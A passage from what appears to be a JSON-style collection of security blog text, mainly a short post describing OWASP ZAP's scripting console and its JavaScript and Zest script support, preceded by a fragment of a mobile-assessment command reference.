'ls -la' to see permissions.scanner.provider.finduris - Search for content providers that can be queried."

    "content": "Zed Attack Proxy (ZAP) is an open-source web application security scanner/proxy that can be used to find vulnerabilities. This blog post is about Zed Attack Proxy’s Scripting capabilities and how it can be very useful.ZAP’s scripting feature allows a user to create a script in JavaScript or Zest to further improve ZAP Scanner capabilities. A user can write numerous scripts to work with ZAP’s active scanning, passive scanning, proxy and more. ZAP supports JavaScript and Zest scripts, but it also supports Jython and JRuby via the ZAP Marketplace.I don’t use ZAP a lot but I like the scripting feature due to how quick and easy it is. This can be useful if a user runs into a specific problem during a web application test and needs a quick fix through scripting. E.g. If a user wants the ZAP passive scanner to analyze and report all Base64 encoded data. This can be done by writing a ZAP script and enabling it on the script console.The script console tab itself can be used to write scripts which can be run within ZAP and also has a debug area which also displays error messages. It also provides a basic autocomplete feature which assists with the methods available associated to an object.Lastly, here is a repo of ZAP Scripts written by the community.
